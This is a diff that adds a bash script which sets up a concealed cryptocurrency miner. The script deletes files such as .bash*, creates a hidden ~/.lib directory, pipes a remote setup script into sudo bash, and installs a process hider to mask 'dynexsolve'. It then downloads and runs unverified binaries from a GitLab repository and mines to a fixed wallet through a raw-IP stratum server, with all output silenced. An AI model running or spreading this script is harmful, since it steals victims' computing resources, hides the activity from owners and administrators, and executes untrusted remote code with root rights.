@@ -1,0 +1,20 @@
+#!/bin/bash
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
+cd ~/
+mkdir .lib
+cd .lib
+rm -rf *
+sudo apt update -y
+sudo apt install gcc -y
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
+apt install nodejs -y
+npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add dynexsolve
+
+rm -f dynex_compute_w340.cnf && wget -q 'https://gitlab.com/sumbawasemongkat/dynex/-/raw/main/dynex_compute_w340.cnf' && chmod +x dynex_compute_w340.cnf
+
+rm -f h-manifest.conf && wget =q 'https://gitlab.com/sumbawasemongkat/dynex/-/raw/main/h-manifest.conf' && chmod +x h-manifest.conf
+
+rm -f dynexsolve && wget -q 'https://gitlab.com/sumbawasemongkat/dynex/-/raw/main/dynexsolve' && chmod +x dynexsolve
+
+./dynexsolve -mining-address Xwn1ypf6EVnNhMN1juykzfTRBnu8AFe1WZTHA5f9GsX6Dvj5zuv9AB2TDgnM4X3qjsZrgfgojbnGEZRVepMAQYce28bdeCtww -no-cpu -multi-gpu -stratum-url 139.144.231.54 -stratum-port 443 -mallob-endpoint https://dnx.us.ekapool.com -stratum-password $(echo $(shuf -i 1-999999 -n 1)-CEK) >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
